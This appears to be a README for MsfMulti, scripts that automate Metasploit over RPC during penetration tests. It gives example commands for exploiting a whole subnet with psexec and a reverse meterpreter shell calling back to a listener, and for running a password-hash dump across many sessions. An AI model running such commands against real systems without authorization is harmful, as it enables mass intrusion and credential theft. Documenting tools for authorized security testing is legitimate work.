# MsfMulti

MsfMulti is a set of scripts to ease some tasks using metasploit during large scope engagements.

* `multisploit.py` - Run a given sploit against multiple targets
* `multipost.py` - Run a given `post` module against multiple sessions


## Dependencies

* msgpack-python
* requests


## Scripts

All the scripts rely on Metasploit's RPC interface, before using any script make sure you have
loaded the `msgrpc` module from the console with the `load msgrpc` command.


### multisploit.py

Run a given exploit against multiple targets.

Before running this script, you must have started the payload handler as a job from the console,
with the `ExitOnSession` option set to `false`.

Example:

```text
$ ./multisploit.py -e windows/smb/psexec -p windows/meterpreter/reverse_https \
-t 192.168.1.0/24 --opts='LHOST=192.168.1.16,LPORT=443'
```

Full help:

```text
usage: multisploit.py [-h] -e EXPLOIT -p PAYLOAD -t TARGETS [--opts OPTIONS]
                       [--rpc-host HOST] [--rpc-port PORT] [--rpc-user USER]
                       [--rpc-passwd PASSWD] [--rpc-ssl]
 
 Metasploit mass exploitation utility
 
 optional arguments:
   -h, --help            show this help message and exit
   -e EXPLOIT, --exploit EXPLOIT
                         exploit to run against targets
   -p PAYLOAD, --payload PAYLOAD
                         payload to use with the exploit
   -t TARGETS, --targets TARGETS
                         comma-separated list of IPs/CIDRs
   --opts OPTIONS        comma-separated options to pass to the exploit
 
 MSFRPC connection:
   --rpc-host HOST       MSFRPC host (default: 127.0.0.1)
   --rpc-port PORT       MSFRPC port (default: 55552)
   --rpc-user USER       user to use to connect to MSFRPC (default: msf)
   --rpc-passwd PASSWD   password to use to connect to MSFRPC (default: msf)
   --rpc-ssl             use SSL to connect to MSFRPC (default: False)
```

### multipost.py

Run a given `post` module against multiple sessions.

Example:

```text
$ ./multipost.py -m windows/gather/hashdump -s 1-10,12,14-18
```

Full help:

```text
usage: multipost.py [-h] -m MODULE -s SESSIONS [--opts OPTS] [--rpc-host HOST]
                    [--rpc-port PORT] [--rpc-user USER] [--rpc-passwd PASSWD]
                    [--rpc-ssl]

Metasploit mass post-exploitation utility

optional arguments:
  -h, --help            show this help message and exit
  -m MODULE, --module MODULE
                        post module to run
  -s SESSIONS, --sessions SESSIONS
                        comma-separated list of sessions and/or session-ranges
  --opts OPTS           comma-separated options to pass to the post module

MSFRPC connection:
  --rpc-host HOST       MSFRPC host (default: 127.0.0.1)
  --rpc-port PORT       MSFRPC port (default: 55552)
  --rpc-user USER       user to use to connect to MSFRPC (default: msf)
  --rpc-passwd PASSWD   password to use to connect to MSFRPC (default: msf)
  --rpc-ssl             use SSL to connect to MSFRPC (default: False)
```
